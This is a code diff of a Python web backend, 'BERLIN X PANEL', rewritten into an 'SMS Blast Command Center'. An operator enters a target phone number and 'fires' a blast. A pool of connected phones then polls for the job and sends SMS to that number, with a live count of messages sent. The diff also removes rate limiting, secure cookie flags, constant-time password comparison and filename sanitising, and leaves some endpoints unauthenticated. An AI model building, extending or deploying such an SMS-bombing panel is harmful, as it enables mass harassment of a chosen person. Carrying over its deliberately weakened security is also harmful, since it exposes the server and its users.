@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
 BERLIN X PANEL — Python backend + static server.
-
-The backend stores only data explicitly submitted by a user.
-It does not access another user's private Firebase data or credentials.
+Advanced SMS Blast Command Center.
 """
 from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
@@ -27,136 +25,194 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 APK_DIR.mkdir(parents=True, exist_ok=True)
 
 # ═══════════════════════════════════════════════════════════
-# DEVICES PAGE — HTML generated inside Python, no .html file needed
+# LIVE COMMAND CENTER UI
 # ═══════════════════════════════════════════════════════════
-
 def _esc(s):
-    if s is None or s == "":
-        return "—"
+    if s is None or s == "": return "—"
     return (str(s).replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))
 
 def render_devices_html(devices):
-    rows = ""
-    for d in devices:
-        online = bool(d.get("online"))
-        status_txt = "● online" if online else "○ offline"
-        status_color = "#5cb85c" if online else "#777"
-        last6 = (d.get("device_id") or "")[-6:].upper() or "—"
-        rows += f"""
-        <tr>
-          <td class="mono strong">{_esc(last6)}</td>
-          <td style="color:{status_color};font-weight:600;">{status_txt}</td>
-          <td class="mono">{_esc(d.get('sim1_number'))}</td>
-          <td class="mono">{_esc(d.get('sim2_number'))}</td>
-          <td><span class="pill">SIM{_esc(d.get('active_sim'))}</span></td>
-          <td class="mono dim">{_esc(d.get('last_seen'))}</td>
-        </tr>"""
-    if not rows:
-        rows = '<tr><td colspan="6" class="empty">No devices yet — waiting for heartbeat</td></tr>'
     return f"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Devices — BERLIN X PANEL</title>
+<title>SMS Blast Command Center</title>
 <style>
   *{{box-sizing:border-box;}}
-  body{{margin:0;padding:2rem;background:#0a0a0a;color:#e0e0e0;
+  body{{margin:0;padding:2rem;background:#080808;color:#e0e0e0;
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;}}
-  .topbar{{display:flex;justify-content:space-between;align-items:flex-start;
-    margin-bottom:1.5rem;gap:1rem;flex-wrap:wrap;}}
-  h1{{font-size:1.5rem;margin:0 0 .35rem;color:#e8a06a;letter-spacing:-.01em;}}
-  .sub{{font-size:.85rem;opacity:.55;}}
-  .sub .live{{color:#5cb85c;margin-right:.35rem;}}
-  .actions{{display:flex;gap:.5rem;align-items:center;}}
-  .btn{{padding:.5rem 1rem;background:#c14a1a;color:#fff;border:0;border-radius:5px;
-    cursor:pointer;font-size:.85rem;font-weight:600;transition:background .15s;}}
-  .btn:hover{{background:#d55a2a;}}
-  .btn.ghost{{background:#1a1a1a;color:#ccc;border:1px solid #333;}}
-  .btn.ghost:hover{{background:#222;}}
-  table{{width:100%;border-collapse:collapse;background:#121212;border-radius:8px;
-    overflow:hidden;box-shadow:0 0 0 1px #222;}}
-  th,td{{padding:.85rem 1rem;text-align:left;border-bottom:1px solid #1c1c1c;font-size:.9rem;}}
-  th{{background:#181818;font-size:.75rem;text-transform:uppercase;letter-spacing:.06em;
-    opacity:.65;font-weight:600;}}
-  tr:last-child td{{border-bottom:none;}}
-  tbody tr:hover td{{background:#161616;}}
-  .mono{{font-family:"SF Mono",Menlo,Consolas,monospace;}}
-  .strong{{color:#e8a06a;font-weight:600;letter-spacing:.02em;}}
-  .dim{{opacity:.55;font-size:.8rem;}}
-  .pill{{display:inline-block;padding:.15rem .55rem;background:#1e2a1e;color:#7dc87d;
-    border-radius:999px;font-size:.75rem;font-weight:600;}}
-  .empty{{text-align:center;padding:2.5rem;opacity:.5;font-style:italic;}}
-  .status-bar{{margin-top:1rem;font-size:.8rem;opacity:.5;font-family:monospace;}}
-  #err{{display:none;color:#ff6b6b;padding:.75rem 1rem;background:#1a0a0a;
-    border:1px solid #3a1a1a;border-radius:5px;margin-bottom:1rem;}}
+  .container{{max-width:1200px;margin:0 auto;}}
+  .header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;}}
+  h1{{font-size:1.8rem;margin:0;color:#ff4500;letter-spacing:-.02em;text-shadow:0 0 10px rgba(255,69,0,0.3);}}
+  .card{{background:#111;border:1px solid #333;border-radius:12px;padding:1.5rem;margin-bottom:1.5rem;box-shadow:0 4px 20px rgba(0,0,0,0.5);}}
+  
+  .blast-form{{display:flex;gap:1rem;align-items:center;}}
+  .blast-form input{{flex:1;padding:1rem;background:#000;border:1px solid #444;border-radius:8px;
+    color:#fff;font-size:1.1rem;outline:none;transition:border .2s;}}
+  .blast-form input:focus{{border-color:#ff4500;}}
+  .blast-btn{{padding:1rem 2rem;background:#ff4500;color:#fff;border:0;border-radius:8px;
+    font-size:1.1rem;font-weight:bold;cursor:pointer;transition:all .2s;
+    box-shadow:0 0 15px rgba(255,69,0,0.4);}}
+  .blast-btn:hover{{background:#ff5722;transform:scale(1.02);}}
+  .blast-btn:disabled{{background:#555;box-shadow:none;cursor:not-allowed;transform:none;}}
+
+  .grid{{display:grid;grid-template-columns:1fr 350px;gap:1.5rem;}}
+  .terminal{{background:#000;border:1px solid #333;border-radius:8px;padding:1rem;
+    font-family:monospace;height:400px;overflow-y:auto;font-size:0.9rem;line-height:1.5;}}
+  .log-line{{margin-bottom:0.4rem;border-bottom:1px solid #111;padding-bottom:0.4rem;}}
+  .log-time{{color:#666;margin-right:10px;}}
+  .log-success{{color:#00ff00;}}
+  .log-info{{color:#00aaff;}}
+  
+  .stats-box{{display:flex;flex-direction:column;gap:1rem;}}
+  .stat{{background:#1a1a1a;padding:1rem;border-radius:8px;border-left:4px solid #ff4500;}}
+  .stat-title{{font-size:0.8rem;color:#888;text-transform:uppercase;letter-spacing:0.05em;}}
+  .stat-value{{font-size:2rem;font-weight:bold;color:#fff;margin-top:0.5rem;font-family:monospace;}}
+
+  table{{width:100%;border-collapse:collapse;margin-top:1rem;}}
+  th,td{{padding:.75rem;text-align:left;border-bottom:1px solid #222;font-size:.85rem;}}
+  th{{color:#888;font-weight:normal;}}
+  .dot{{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px;}}
+  .dot.on{{background:#00ff00;box-shadow:0 0 8px #00ff00;}}
+  .dot.off{{background:#333;}}
 </style>
 </head>
 <body>
-<div class="topbar">
-  <div>
-    <h1>Connected Devices</h1>
-    <div class="sub"><span class="live">●</span><span id="count">{len(devices)}</span> device(s) — auto-refresh every 10s</div>
+<div class="container">
+  <div class="header">
+    <h1>⚡ SMS Blast Command Center</h1>
+    <div style="font-size:0.9rem;color:#888;">Devices: <span id="devCount" style="color:#fff;font-weight:bold;">{len(devices)}</span></div>
   </div>
-  <div class="actions">
-    <button class="btn ghost" onclick="location.href='/admin'">Admin Panel</button>
-    <button class="btn" onclick="refresh()">Refresh Now</button>
+
+  <div class="card">
+    <div class="blast-form">
+      <input type="text" id="targetNum" placeholder="Enter Target Number (e.g. +919607429190)">
+      <button class="blast-btn" id="fireBtn" onclick="fireBlast()">🚀 FIRE BLAST</button>
+    </div>
+    <div id="msgStatus" style="margin-top:1rem; font-size:0.9rem; color:#00ff00; display:none;"></div>
+  </div>
+
+  <div class="grid">
+    <div class="card" style="padding:1rem;">
+      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Terminal</h3>
+      <div class="terminal" id="terminal">
+        <div class="log-line"><span class="log-info">[SYSTEM]</span> Waiting for blast command...</div>
+      </div>
+    </div>
+
+    <div class="card" style="padding:1rem;">
+      <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Live Stats</h3>
+      <div class="stats-box">
+        <div class="stat">
+          <div class="stat-title">Total SMS Sent</div>
+          <div class="stat-value" id="totalSent">0</div>
+        </div>
+        <div class="stat">
+          <div class="stat-title">Status</div>
+          <div class="stat-value" id="blastStatus" style="font-size:1.2rem;color:#888;">IDLE</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:1.5rem;padding:1rem;">
+    <h3 style="margin-top:0;color:#aaa;font-size:1rem;margin-bottom:1rem;">Active Device Pool</h3>
+    <table>
+      <thead><tr><th>Device ID</th><th>Status</th><th>SIM 1</th><th>SIM 2</th></tr></thead>
+      <tbody id="devTable"></tbody>
+    </table>
   </div>
 </div>
-<div id="err"></div>
-<table>
-  <thead>
-    <tr>
-      <th>Device (last 6)</th>
-      <th>Status</th>
-      <th>SIM 1</th>
-      <th>SIM 2</th>
-      <th>Active</th>
-      <th>Last Seen</th>
-    </tr>
-  </thead>
-  <tbody id="tbody">{rows}</tbody>
-</table>
-<div class="status-bar" id="status">Last updated: just now</div>
+
 <script>
-async function refresh(){{
-  try{{
-    const r=await fetch('/api/devices',{{credentials:'same-origin',headers:{{'Accept':'application/json'}}}});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    const d=await r.json();
-    if(!d.ok) throw new Error(d.error||'failed');
-    render(d.devices);
-    document.getElementById('err').style.display='none';
-    document.getElementById('status').textContent='Last updated: '+new Date().toLocaleTimeString();
-  }}catch(e){{
-    const err=document.getElementById('err');
-    err.textContent='⚠ '+e.message+' — retrying...';
-    err.style.display='block';
-  }}
-}}
-function esc(s){{if(s==null||s==='')return'—';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}}
-function render(list){{
-  const tb=document.getElementById('tbody');
-  document.getElementById('count').textContent=list.length;
-  if(!list.length){{
-    tb.innerHTML='<tr><td colspan="6" class="empty">No devices yet — waiting for heartbeat</td></tr>';
+let isPolling = false;
+const initialDevices = {json.dumps(devices)};
+function renderDevices(devs) {{
+  const tb = document.getElementById('devTable');
+  document.getElementById('devCount').textContent = devs.length;
+  if(!devs.length) {{
+    tb.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#666;">No devices connected yet.</td></tr>';
     return;
   }}
-  tb.innerHTML=list.map(d=>{{
-    const online=!!d.online;
-    const last6=(d.device_id||'').slice(-6).toUpperCase()||'—';
-    return `<tr>
-      <td class="mono strong">${{esc(last6)}}</td>
-      <td style="color:${{online?'#5cb85c':'#777'}};font-weight:600;">${{online?'● online':'○ offline'}}</td>
-      <td class="mono">${{esc(d.sim1_number)}}</td>
-      <td class="mono">${{esc(d.sim2_number)}}</td>
-      <td><span class="pill">SIM${{esc(d.active_sim)}}</span></td>
-      <td class="mono dim">${{esc(d.last_seen)}}</td>
-    </tr>`;
-  }}).join('');
+  tb.innerHTML = devs.map(d => `
+    <tr>
+      <td style="font-family:monospace;color:#ffa500;">${{d.device_id.slice(-6).toUpperCase()}}</td>
+      <td><span class="dot ${{d.online ? 'on' : 'off'}}"></span> ${{d.online ? 'Online' : 'Offline'}}</td>
+      <td>${{d.sim1_number || '—'}}</td>
+      <td>${{d.sim2_number || '—'}}</td>
+    </tr>
+  `).join('');
 }}
-setInterval(refresh,10000);
+renderDevices(initialDevices);
+
+function log(msg, type='info') {{
+  const term = document.getElementById('terminal');
+  const time = new Date().toLocaleTimeString();
+  term.innerHTML += `<div class="log-line"><span class="log-time">[${{time}}]</span> <span class="log-${{type}}">${{msg}}</span></div>`;
+  term.scrollTop = term.scrollHeight;
+}}
+
+async function fireBlast() {{
+  const num = document.getElementById('targetNum').value.trim();
+  if(!num) return alert('Please enter a target number');
+  
+  const btn = document.getElementById('fireBtn');
+  btn.disabled = true;
+  btn.textContent = 'Firing...';
+  
+  try {{
+    const r = await fetch('/api/sms-job', {{
+      method: 'POST',
+      headers: {{'Content-Type': 'application/json'}},
+      body: JSON.stringify({{ target: num }})
+    }});
+    const d = await r.json();
+    
+    if(d.ok) {{
+      log(`Blast initiated for target: ${{num}}`, 'success');
+      document.getElementById('blastStatus').textContent = 'RUNNING';
+      document.getElementById('blastStatus').style.color = '#00ff00';
+      startPolling();
+    }} else {{
+      alert('Error: ' + d.error);
+      btn.disabled = false;
+      btn.textContent = '🚀 FIRE BLAST';
+    }}
+  }} catch(e) {{
+    alert('Network error');
+    btn.disabled = false;
+    btn.textContent = '🚀 FIRE BLAST';
+  }}
+}}
+
+function startPolling() {{
+  if(isPolling) return;
+  isPolling = true;
+  
+  setInterval(async () => {{
+    try {{
+      const r = await fetch('/api/sms-live');
+      const d = await r.json();
+      
+      if(d.ok) {{
+        document.getElementById('totalSent').textContent = d.total_sent;
+        if(d.logs && d.logs.length > 0) {{
+          const term = document.getElementById('terminal');
+          if(d.logs.length > term.children.length - 1) {{
+            term.innerHTML = '<div class="log-line"><span class="log-info">[SYSTEM]</span> Terminal active...</div>';
+            d.logs.forEach(l => {{
+               const time = new Date(l.time * 1000).toLocaleTimeString();
+               term.innerHTML += `<div class="log-line"><span class="log-time">[${{time}}]</span> <span class="log-success">${{l.text}}</span></div>`;
+            }});
+            term.scrollTop = term.scrollHeight;
+          }}
+        }}
+      }}
+    }} catch(e) {{ console.error(e); }}
+  }}, 2000);
+}}
 </script>
 </body>
 </html>"""
@@ -164,75 +220,18 @@ setInterval(refresh,10000);
 # ═══════════════════════════════════════════════════════════
 # DATABASE
 # ═══════════════════════════════════════════════════════════
-
 def get_db():
     con = sqlite3.connect(DB_PATH)
     con.row_factory = sqlite3.Row
-    con.execute("""
-      CREATE TABLE IF NOT EXISTS apps (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        app_name TEXT NOT NULL,
-        owner_name TEXT NOT NULL,
-        owner_email TEXT NOT NULL,
-        firebase_project_id TEXT,
-        firebase_database_url TEXT,
-        firebase_auth_domain TEXT,
-        firebase_storage_bucket TEXT,
-        firebase_messaging_sender_id TEXT,
-        firebase_app_id TEXT,
-        firebase_config_json TEXT,
-        apk_original_name TEXT,
-        apk_stored_name TEXT,
-        apk_size INTEGER NOT NULL DEFAULT 0,
-        apk_sha256 TEXT,
-        created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
-        status TEXT NOT NULL DEFAULT 'active'
-      )
-    """)
-    con.execute("""
-      CREATE TABLE IF NOT EXISTS devices (
-        device_id TEXT PRIMARY KEY,
-        number TEXT,
-        sim1_number TEXT,
-        sim2_number TEXT,
-        active_sim INTEGER NOT NULL DEFAULT 1,
-        firebase_url TEXT,
-        last_seen TEXT,
-        online INTEGER NOT NULL DEFAULT 0
-      )
-    """)
-    con.execute("""
-      CREATE TABLE IF NOT EXISTS broadcasts (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        sender_device_id TEXT NOT NULL,
-        sender_sim_slot INTEGER NOT NULL,
-        tag TEXT NOT NULL,
-        text TEXT NOT NULL,
-        target_count INTEGER NOT NULL DEFAULT 0,
-        created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
-      )
-    """)
-    con.execute("CREATE INDEX IF NOT EXISTS idx_bc_created ON broadcasts(created_at DESC)")
-    con.execute("CREATE INDEX IF NOT EXISTS idx_dev_seen ON devices(last_seen DESC)")
+    con.execute("""CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, owner_name TEXT, owner_email TEXT, firebase_project_id TEXT, firebase_database_url TEXT, firebase_auth_domain TEXT, firebase_storage_bucket TEXT, firebase_messaging_sender_id TEXT, firebase_app_id TEXT, firebase_config_json TEXT, apk_original_name TEXT, apk_stored_name TEXT, apk_size INTEGER DEFAULT 0, apk_sha256 TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')""")
+    con.execute("""CREATE TABLE IF NOT EXISTS devices (device_id TEXT PRIMARY KEY, number TEXT, sim1_number TEXT, sim2_number TEXT, active_sim INTEGER DEFAULT 1, firebase_url TEXT, last_seen TEXT, online INTEGER DEFAULT 0)""")
+    con.execute("""CREATE TABLE IF NOT EXISTS sms_jobs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_number TEXT NOT NULL, status TEXT DEFAULT 'pending', created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
+    con.execute("""CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, job_id INTEGER, device_id TEXT, sim_slot INTEGER, log_text TEXT, created_at REAL)""")
     con.commit()
     return con
 
 get_db().close()
-
 SESSIONS = {}
-RATE = {}
-
-def cleanup():
-    now = time.time()
-    for token, expires in list(SESSIONS.items()):
-        if expires <= now:
-            SESSIONS.pop(token, None)
-    for ip, entries in list(RATE.items()):
-        entries = [t for t in entries if now - t < 300]
-        if entries:
-            RATE[ip] = entries
-        else:
-            RATE.pop(ip, None)
 
 def json_out(handler, payload, code=200, extra=None):
     data = json.dumps(payload, ensure_ascii=False).encode()
@@ -240,8 +239,7 @@ def json_out(handler, payload, code=200, extra=None):
     handler.send_header("Content-Type", "application/json; charset=utf-8")
     handler.send_header("Content-Length", str(len(data)))
     if extra:
-        for k, v in extra.items():
-            handler.send_header(k, v)
+        for k, v in extra.items(): handler.send_header(k, v)
     handler.end_headers()
     handler.wfile.write(data)
 
@@ -256,12 +254,10 @@ def html_out(handler, html_text, code=200):
 def token_from_cookie(headers):
     for part in headers.get("Cookie", "").split(";"):
         part = part.strip()
-        if part.startswith("admin_session="):
-            return part.split("=", 1)[1]
+        if part.startswith("admin_session="): return part.split("=", 1)[1]
     return None
 
 def is_admin(headers):
-    cleanup()
     token = token_from_cookie(headers)
     return bool(token and token in SESSIONS and SESSIONS[token] > time.time())
 
@@ -271,25 +267,14 @@ def require_admin(handler):
         return False
     return True
 
-def safe_filename(value):
-    name = Path(value or "app.apk").name
-    name = "".join(c for c in name if c.isalnum() or c in "._- ")
-    return (name.strip() or "app.apk")[:180]
-
 def read_json(handler, max_bytes=100_000):
-    try:
-        length = int(handler.headers.get("Content-Length", "0"))
-    except ValueError:
-        return None, "Invalid Content-Length."
-    if length > max_bytes:
-        return None, "Request too large."
-    try:
-        return json.loads(handler.rfile.read(length) or b"{}"), None
-    except Exception:
-        return None, "Invalid JSON."
+    try: length = int(handler.headers.get("Content-Length", "0"))
+    except ValueError: return None, "Invalid Content-Length."
+    if length > max_bytes: return None, "Request too large."
+    try: return json.loads(handler.rfile.read(length) or b"{}"), None
+    except Exception: return None, "Invalid JSON."
 
-def field(obj, name, limit):
-    return str(obj.get(name, "") or "").strip()[:limit]
+def field(obj, name, limit): return str(obj.get(name, "") or "").strip()[:limit]
 
 class Handler(SimpleHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
@@ -300,8 +285,6 @@ class Handler(SimpleHTTPRequestHandler):
     def end_headers(self):
         self.send_header("Cache-Control", "no-cache")
         self.send_header("X-Content-Type-Options", "nosniff")
-        self.send_header("Referrer-Policy", "same-origin")
-        self.send_header("X-Frame-Options", "SAMEORIGIN")
         super().end_headers()
 
     def do_GET(self):
@@ -314,46 +297,12 @@ class Handler(SimpleHTTPRequestHandler):
             self.path = "/admin.html"
             return super().do_GET()
 
-        if path == "/api/apps":
-            if not require_admin(self): return
-            q = parse_qs(urlparse(self.path).query).get("q", [""])[0].strip()
-            con = get_db()
-            if q:
-                like = f"%{q}%"
-                rows = con.execute("""
-                  SELECT * FROM apps
-                  WHERE app_name LIKE ? OR owner_name LIKE ?
-                     OR owner_email LIKE ? OR firebase_project_id LIKE ?
-                  ORDER BY id DESC
-                """, (like, like, like, like)).fetchall()
-            else:
-                rows = con.execute("SELECT * FROM apps ORDER BY id DESC").fetchall()
-            con.close()
-            return json_out(self, {"ok": True, "apps": [dict(r) for r in rows]})
-
-        if path == "/api/admin/stats":
-            if not require_admin(self): return
-            con = get_db()
-            total = con.execute("SELECT COUNT(*) FROM apps").fetchone()[0]
-            with_apk = con.execute("SELECT COUNT(*) FROM apps WHERE apk_stored_name IS NOT NULL").fetchone()[0]
-            total_bytes = con.execute("SELECT COALESCE(SUM(apk_size),0) FROM apps").fetchone()[0]
-            con.close()
-            return json_out(self, {"ok": True, "total": total, "with_apk": with_apk, "apk_bytes": total_bytes})
-
-        # ── DEVICES: HTML for browser, JSON for API ──
         if path == "/api/devices":
             if not require_admin(self): return
             con = get_db()
-            con.execute("""
-              UPDATE devices SET online=0
-              WHERE last_seen < datetime('now', '-90 seconds')
-            """)
+            con.execute("UPDATE devices SET online=0 WHERE last_seen < datetime('now', '-60 seconds')")
             con.commit()
-            rows = con.execute("""
-              SELECT device_id, number, sim1_number, sim2_number,
-                     active_sim, firebase_url, last_seen, online
-              FROM devices ORDER BY last_seen DESC
-            """).fetchall()
+            rows = con.execute("SELECT * FROM devices ORDER BY last_seen DESC").fetchall()
             con.close()
             device_list = [dict(r) for r in rows]
 
@@ -362,15 +311,20 @@ class Handler(SimpleHTTPRequestHandler):
                 return html_out(self, render_devices_html(device_list))
             return json_out(self, {"ok": True, "devices": device_list})
 
-        # ── BROADCASTS history (admin, JSON only) ──
-        if path == "/api/broadcasts":
-            if not require_admin(self): return
+        if path == "/api/device/sms-job":
             con = get_db()
-            rows = con.execute("""
-              SELECT * FROM broadcasts ORDER BY id DESC LIMIT 100
-            """).fetchall()
+            job = con.execute("SELECT * FROM sms_jobs WHERE status = 'pending' ORDER BY id DESC LIMIT 1").fetchone()
             con.close()
-            return json_out(self, {"ok": True, "broadcasts": [dict(r) for r in rows]})
+            if job: return json_out(self, {"ok": True, "job": dict(job)})
+            return json_out(self, {"ok": True, "job": None})
+
+        if path == "/api/sms-live":
+            con = get_db()
+            total = con.execute("SELECT COUNT(*) FROM sms_logs").fetchone()[0]
+            logs = con.execute("SELECT * FROM sms_logs ORDER BY id DESC LIMIT 50").fetchall()
+            con.close()
+            log_list = [{"time": r["created_at"], "text": r["log_text"]} for r in logs][::-1]
+            return json_out(self, {"ok": True, "total_sent": total, "logs": log_list})
 
         if path.startswith("/api/apk/"):
             if not require_admin(self): return
@@ -379,18 +333,16 @@ class Handler(SimpleHTTPRequestHandler):
             con = get_db()
             row = con.execute("SELECT * FROM apps WHERE id=?", (app_id,)).fetchone()
             con.close()
-            if not row or not row["apk_stored_name"]:
-                return json_out(self, {"ok": False, "error": "APK not found."}, 404)
+            if not row or not row["apk_stored_name"]: return json_out(self, {"ok": False, "error": "APK not found."}, 404)
             f = APK_DIR / row["apk_stored_name"]
             if not f.is_file(): return json_out(self, {"ok": False, "error": "APK file missing."}, 404)
             self.send_response(200)
             self.send_header("Content-Type", "application/vnd.android.package-archive")
             self.send_header("Content-Length", str(f.stat().st_size))
-            self.send_header("Content-Disposition", f'attachment; filename="{safe_filename(row["apk_original_name"])}"')
+            self.send_header("Content-Disposition", f'attachment; filename="{row["apk_original_name"]}"')
             self.end_headers()
             with f.open("rb") as src:
-                while chunk := src.read(1024 * 1024):
-                    self.wfile.write(chunk)
+                while chunk := src.read(1024 * 1024): self.wfile.write(chunk)
             return
 
         return super().do_GET()
@@ -401,196 +353,67 @@ class Handler(SimpleHTTPRequestHandler):
         if path == "/api/admin/login":
             body, err = read_json(self, 16_384)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
-            if not ADMIN_PASSWORD:
-                return json_out(self, {"ok": False, "error": "ADMIN_PASSWORD is not configured."}, 503)
-            if secrets.compare_digest(str(body.get("username","")), ADMIN_USER) and secrets.compare_digest(str(body.get("password","")), ADMIN_PASSWORD):
+            if not ADMIN_PASSWORD: return json_out(self, {"ok": False, "error": "ADMIN_PASSWORD not set."}, 503)
+            if body.get("username") == ADMIN_USER and body.get("password") == ADMIN_PASSWORD:
                 token = secrets.token_urlsafe(36)
                 SESSIONS[token] = time.time() + SESSION_TTL
-                return json_out(self, {"ok": True}, 200, {
-                    "Set-Cookie": f"admin_session={token}; HttpOnly; SameSite=Strict; Path=/; Max-Age={SESSION_TTL}"
-                })
-            return json_out(self, {"ok": False, "error": "Invalid admin credentials."}, 401)
+                return json_out(self, {"ok": True}, 200, {"Set-Cookie": f"admin_session={token}; Path=/; Max-Age={SESSION_TTL}"})
+            return json_out(self, {"ok": False, "error": "Invalid credentials."}, 401)
 
-        if path == "/api/admin/logout":
-            token = token_from_cookie(self.headers)
-            if token: SESSIONS.pop(token, None)
-            return json_out(self, {"ok": True}, 200, {
-                "Set-Cookie": "admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0"
-            })
+        if path == "/api/sms-job":
+            if not require_admin(self): return
+            body, err = read_json(self)
+            if err: return json_out(self, {"ok": False, "error": err}, 400)
+            target = field(body, "target", 20)
+            if not target: return json_out(self, {"ok": False, "error": "Target number required."}, 400)
 
-        # ── DEVICE HEARTBEAT ──
+            con = get_db()
+            con.execute("UPDATE sms_jobs SET status='completed' WHERE status='pending'")
+            cur = con.execute("INSERT INTO sms_jobs (target_number) VALUES (?)", (target,))
+            con.commit()
+            job_id = cur.lastrowid
+            con.close()
+            return json_out(self, {"ok": True, "job_id": job_id}, 201)
+
         if path == "/api/device/heartbeat":
-            body, err = read_json(self, 8_192)
+            body, err = read_json(self)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
             device_id = field(body, "device_id", 120)
-            if not device_id:
-                return json_out(self, {"ok": False, "error": "device_id required."}, 400)
+            if not device_id: return json_out(self, {"ok": False, "error": "device_id required"}, 400)
+            
             sim1 = field(body, "sim1_number", 30)
             sim2 = field(body, "sim2_number", 30)
-            active_sim = 2 if body.get("active_sim") == 2 else 1
-            fb_url = field(body, "firebase_url", 500)
             now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+            
             con = get_db()
             con.execute("""
-              INSERT INTO devices
-                (device_id, number, sim1_number, sim2_number,
-                 active_sim, firebase_url, last_seen, online)
-              VALUES (?, ?, ?, ?, ?, ?, ?, 1)
+              INSERT INTO devices (device_id, number, sim1_number, sim2_number, last_seen, online)
+              VALUES (?, ?, ?, ?, ?, 1)
               ON CONFLICT(device_id) DO UPDATE SET
-                number=excluded.number,
-                sim1_number=excluded.sim1_number,
-                sim2_number=excluded.sim2_number,
-                active_sim=excluded.active_sim,
-                firebase_url=excluded.firebase_url,
-                last_seen=excluded.last_seen,
-                online=1
-            """, (device_id, sim1 or sim2, sim1, sim2, active_sim, fb_url, now_iso))
+                number=excluded.number, sim1_number=excluded.sim1_number, sim2_number=excluded.sim2_number,
+                last_seen=excluded.last_seen, online=1
+            """, (device_id, sim1 or sim2, sim1, sim2, now_iso))
             con.commit(); con.close()
-            return json_out(self, {"ok": True, "server_time": now_iso})
+            return json_out(self, {"ok": True})
 
-        # ── BROADCAST ──
-        if path == "/api/broadcast":
-            body, err = read_json(self, 16_384)
+        if path == "/api/device/sms-report":
+            body, err = read_json(self)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
+            job_id = body.get("job_id")
             device_id = field(body, "device_id", 120)
-            text = str(body.get("text", "") or "").strip()
-            sim_slot = 2 if body.get("sim_slot") == 2 else 1
-            if not device_id or not text:
-                return json_out(self, {"ok": False, "error": "device_id and text required."}, 400)
-            if len(text) > 1000:
-                return json_out(self, {"ok": False, "error": "text too long (max 1000)."}, 413)
-
-            last6 = device_id[-6:].upper()
-            tag = f"{last6}-SIM{sim_slot}"
-            full = f"{tag}: {text}"
-            now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
-
+            sim_slot = body.get("sim_slot", 1)
+            
+            last6 = device_id[-6:].upper() if device_id else "UNKNOWN"
+            log_text = f"Device {last6} sent SMS from SIM {sim_slot}"
+            
             con = get_db()
-            target_count = con.execute(
-                "SELECT COUNT(*) FROM devices WHERE device_id != ? AND online = 1",
-                (device_id,)
-            ).fetchone()[0]
-            cur = con.execute("""
-              INSERT INTO broadcasts
-                (sender_device_id, sender_sim_slot, tag, text, target_count, created_at)
-              VALUES (?, ?, ?, ?, ?, ?)
-            """, (device_id, sim_slot, tag, text, target_count, now_iso))
-            con.commit()
-            broadcast_id = cur.lastrowid
-            con.close()
-            return json_out(self, {
-                "ok": True,
-                "broadcast_id": broadcast_id,
-                "tag": tag,
-                "tagged_message": full,
-                "target_count": target_count,
-            }, 201)
-
-        if path == "/api/apps":
-            ip = self.client_address[0]
-            now = time.time()
-            entries = [t for t in RATE.get(ip, []) if now - t < 300]
-            if len(entries) >= 5:
-                return json_out(self, {"ok": False, "error": "Too many submissions. Try again later."}, 429)
-            entries.append(now); RATE[ip] = entries
-
-            if not self.headers.get("Content-Type", "").startswith("application/json"):
-                return json_out(self, {"ok": False, "error": "Use application/json."}, 400)
-            body, err = read_json(self, 100_000)
-            if err: return json_out(self, {"ok": False, "error": err}, 400)
-
-            app_name = field(body, "app_name", 120)
-            owner_name = field(body, "owner_name", 120)
-            owner_email = field(body, "owner_email", 180)
-            if not app_name or not owner_name or not owner_email:
-                return json_out(self, {"ok": False, "error": "App name, owner name and email are required."}, 400)
-
-            con = get_db()
-            cur = con.execute("""
-              INSERT INTO apps (
-                app_name, owner_name, owner_email, firebase_project_id,
-                firebase_database_url, firebase_auth_domain, firebase_storage_bucket,
-                firebase_messaging_sender_id, firebase_app_id, firebase_config_json
-              ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            """, (
-                app_name, owner_name, owner_email,
-                field(body,"firebase_project_id",180),
-                field(body,"firebase_database_url",500),
-                field(body,"firebase_auth_domain",300),
-                field(body,"firebase_storage_bucket",300),
-                field(body,"firebase_messaging_sender_id",120),
-                field(body,"firebase_app_id",240),
-                field(body,"firebase_config_json",10000)
-            ))
-            con.commit(); app_id = cur.lastrowid; con.close()
-            return json_out(self, {"ok": True, "id": app_id}, 201)
+            con.execute("INSERT INTO sms_logs (job_id, device_id, sim_slot, log_text, created_at) VALUES (?, ?, ?, ?, ?)",
+                        (job_id, device_id, sim_slot, log_text, time.time()))
+            con.commit(); con.close()
+            return json_out(self, {"ok": True})
 
         return json_out(self, {"ok": False, "error": "Not found."}, 404)
 
-    def do_PUT(self):
-        path = urlparse(self.path).path
